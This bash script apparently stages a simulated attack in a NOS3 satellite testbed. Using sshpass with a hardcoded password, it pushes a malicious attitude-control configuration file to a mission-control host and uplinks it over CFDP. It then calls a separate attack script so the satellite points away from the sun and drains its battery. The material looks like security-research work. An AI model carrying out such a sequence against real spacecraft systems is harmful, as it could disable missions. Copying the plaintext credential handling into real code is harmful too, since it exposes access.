#!/bin/bash

source /home/nos3/Install_tools_nos3/IP_Scenario.sh

# load the malicious Inp_ADAC.txt for ADCS for SAT2 (SAT2 in Sunsafe mode)
#/usr/bin/sshpass -p nos3123! scp Inp_ADAC_Mal.txt nos3@$IPSAT2:/home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/Inp_ADAC.txt  # for more realistic attack use CFDP TC (not working with NOS3 v1.6.2)

/usr/bin/sshpass -p nos3123! scp Inp_ADAC_Mal.txt nos3@$IPMCS:/home/nos3/Desktop/github-nos3/fsw/build/exe/cpu1/cf/Inp_ADAC_Mal.txt  # copy Inp_ADAC_Mal.txt in /cf of MCS

# Request CFDP uplink of the malicious Inp_ADAC.txt
/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPMCS "cd /home/nos3/Input_Generator; python3 Main.py send scenarios/uplinkCFDP_ADAC.json --port 6012"

# RESTART ADCS + EPS SWITCH 'ON' 1 - 7 for SAT2 + SUNSAFE MODE
python3 Attack_A11.py

# expected: the satellite X body axis will stabilize opposite to sun vector + battery will slowly discharge (mainly due to switch) 
# EPS model is not realistic! to be improved. 


## example if you need to modify the .json
#/usr/bin/sshpass -p nos3123! ssh -XY nos3@$IPMCS "cp /home/nos3/Input_Generator/scenarios/uplinkCFDP.json /home/nos3/Input_Generator/scenarios/uplinkCFDP1.json"
#search1="PARASRC"
#replace1="Inp_ADAC_Mal.txt"
#search2="PARADST"
#replace2="Inp_ADAC.txt"
#jsonfile="../Input_Generator/scenarios/uplinkCFDP1.json"
#sed -i "s{$search1{$replace1{g" "$jsonfile"
#sed -i "s{$search2{$replace2{g" "$jsonfile"
